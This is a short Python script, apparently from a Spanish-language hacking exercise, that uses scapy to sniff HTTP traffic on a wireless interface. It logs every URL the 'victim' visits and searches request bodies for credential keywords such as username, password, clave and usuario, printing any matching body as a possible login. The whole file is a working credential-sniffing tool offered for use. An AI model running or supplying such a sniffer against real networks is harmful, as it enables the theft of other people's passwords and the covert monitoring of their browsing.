#!/usr/bin/env python3

import scapy.all as scapy
import signal
import sys
from termcolor import colored
from scapy.layers import http

def def_handler(sig, frame):
    print(colored("\n[!] Saliendo de HTTP Sniffer...\n", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def process_packet(packet):
    
    cred_keys = ["username", "user", "login", "password", "pass", "pwd", "email", "mail", "usr", "clave", "contras", "usuario"]
    
    if packet.haslayer(http.HTTPRequest):
        
        url = "http://" + packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
        print(colored(f"\n[+] URL visitada por la victima: {url}", "blue"))
        
        if packet.haslayer(scapy.Raw):
            try:
                load = packet[scapy.Raw].load.decode()
                for key in cred_keys:
                    if key in load:
                        print(colored(f"\n[+] Possible username/password found: {load} \n", "green"))
                        break
            except:
                pass        

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet)

def main():
    print(colored("[*] HTTP Sniffer started. Waiting for HTTP requests...", "yellow"))
    sniff("wlp4s0")

if __name__ == "__main__":
    main()